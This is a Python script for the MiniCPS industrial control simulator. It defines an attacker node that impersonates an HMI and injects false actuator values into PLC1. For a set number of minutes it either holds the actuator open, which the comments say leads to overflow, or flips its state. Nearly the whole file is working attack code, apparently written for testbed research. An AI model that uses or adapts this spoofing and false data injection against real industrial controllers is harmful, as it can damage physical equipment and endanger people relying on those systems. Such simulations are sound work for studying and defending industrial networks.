##### Script to launch command injection attack from attacker node disguised as HMI node 
#### FDI  == false data injection 
### Impersonating hmi



from random import random
from minicps.devices import HMI
from utils import STATE, PLC1_ADDR
from utils import HMI_PROTOCOL, HMI_DATA, HMI_ADDR, HMI_PERIOD_SEC

import sys
import time
import logging
from datetime import datetime as dt

ACTUATOR1 = ("ACTUATOR1-MV", 1)  # to be received from PLC1

class FPHMI(HMI):
    random = None
    def main_loop(self):
        """hmi main loop.
        - monitor PLC1 tag (actuator1)
        """

        print("DEBUG: FP HMI enters main_loop.")
        print

        logging.basicConfig(
            filename="logs/hmi.log",
            format="%(levelname)s %(asctime)s "
            + HMI_ADDR
            + " %(funcName)s %(message)s",
            datefmt="%m/%d/%Y %H:%M:%S",
            level=logging.DEBUG,
        )
        print("START TIME:", str(dt.now()))
        delay = 60 * int(sys.argv[1]) # delay in seconds
        close_time = time.time() + delay
        while close_time > time.time():
            motor_status = int(self.get(ACTUATOR1))

            """"We basically changing the actuator value to the opposite -- old school command line injection"""

            if random == None:
                """ another clever way is to set the value to 1 or 0 all the time, this will result in actuator always open
                    which later on cause overflow
                """

                toggle_status = 1
                print("Acutal status:", motor_status)
                print("Attacking PLC1 with false data injection constant value: ", toggle_status)
                self.set(ACTUATOR1, toggle_status)
                self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
                time.sleep(0.5)
                logging.info("FDI Constant: Actuator status changed to: %s" % toggle_status)
            else:
                toggle_status = int(not motor_status)
                print("Acutal status:", motor_status)
                print("Attacking PLC1 with false data injection not value: ", toggle_status)
                self.set(ACTUATOR1, toggle_status)
                self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
                time.sleep(0.5)
                logging.info("FDI toggle: Actuator status changed to %s" % toggle_status)


        print("END TIME:", str(dt.now()))


if __name__ == "__main__":

    hmi = FPHMI( name="hmi", state=STATE, protocol=HMI_PROTOCOL, memory=HMI_DATA, disk=HMI_DATA )
